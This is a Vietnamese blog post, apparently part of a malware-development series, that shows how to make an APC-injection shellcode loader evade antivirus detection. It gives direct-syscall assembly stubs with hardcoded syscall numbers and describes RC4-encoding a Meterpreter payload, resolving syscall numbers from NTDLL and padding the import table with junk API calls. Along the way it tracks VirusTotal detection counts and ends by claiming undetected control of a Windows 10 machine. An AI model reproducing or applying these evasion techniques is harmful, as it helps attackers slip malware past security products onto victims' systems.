## Bypass AV
Phần này sử dụng mẫu [APC Injection](https://github.com/vuongle-vigo/MalwareDevTechnique-Blog/tree/main/11-3-2024%20APC%20Injection) đã được đề cập trước đây.
Các kĩ thuật áp dụng cố gắng giảm thiểu tối đa AV phát hiện trên [VirusTotal](https://www.virustotal.com/gui/home/upload).

### Đánh giá mã gốc

Bản gốc sử dụng [Malware Compiling Technique](https://github.com/vuongle-vigo/MalwareDevTechnique-Blog/tree/main/18-3-2024%20Malware%20Compiling), quan sát bảng IAT ta có kết quả sau:
![iat1](images/iat1.png)

Kết quả Virus Total:

![virus1](images/virus1.png)

Mã gốc đã được ẩn CRT và các API không sử dụng trong bảng IAT, tuy nhiên để lộ rõ các API được sử dụng trong APC Injection, Shellcode chưa được mã hóa => Bị phát hiện theo signature.

### Syscalls ASM Code

Kỹ thuật sử dụng: [Syscalls](https://github.com/vuongle-vigo/MalwareDevTechnique-Blog/tree/main/18-3-2024%20Syscalls)

Sử dụng `WinDbg` tìm SSN của Syscall, xây dựng được file `syscall.asm` như sau:

```asm
.code
	SysNtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, 18h
		syscall
		ret
	SysNtAllocateVirtualMemory endp

	SysNtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, 3Ah
		syscall
		ret
	SysNtWriteVirtualMemory endp

	SysNtProtectVirtualMemory proc
		mov r10, rcx
		mov eax, 50h
		syscall
		ret
	SysNtProtectVirtualMemory endp

	SysNtQueueApcThread proc
		mov r10, rcx
		mov eax, 45h
		syscall
		ret
	SysNtQueueApcThread endp

	SysNtResumeThread proc
		mov r10, rcx
		mov eax, 52h
		syscall
		ret
	SysNtResumeThread endp
end
```
Với kĩ thuật này, kết quả virus total:

![virus2](images/virus2.png)

1 số AV phát hiện là dựa vào Signature của Meterpreter, sử dụng [RC4 Payload Encode](https://github.com/vuongle-vigo/MalwareDevTechnique-Blog/tree/main/30-12-2023%20Payload%20Encryption), kết quả nhận được:

![virus3](images/virus3.png)

### Syscalls Custom SSN Code
Thay thế kĩ thuật syscall bằng mã asm chỉ định ở trên bằng kĩ thuật tìm SSN code trong thư viện NTDLL, sau đó gọi hàm syscall, kết quả được cải thiện đáng kể.

Bảng IAT:

![iat2](images/iat2.png)

![virus4](images/virus4.png)


### Import junk API 
Kiểm tra bảng IAT, việc file thực thi sử dụng 1 lượng ít API cũng khiến nó trở nên khả nghi, tiến hành thêm junk API vào:
```c
unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
i = GetLastError();
i = SetCriticalSectionSpinCount(NULL, NULL);
i = GetWindowContextHelpId(NULL);
i = GetWindowLongPtrW(NULL, NULL);
i = RegisterClassW(NULL);
i = IsWindowVisible(NULL);
i = ConvertDefaultLocale(NULL);
i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
i = IsDialogMessageW(NULL, NULL);
```

Kết quả:
![virus5](images/virus5.png)


### Loại bỏ API CreateProcess 

![virus6](images/virus6.png)

### Test Windows Defender Runtime

Sử dụng shellcode msfvenom của kali:

![wdf1](images/wdf1.png)

Chiếm được quyển điều khiển của windows 10 mà không bị phát hiện:

![kali1](images/kali1.png)
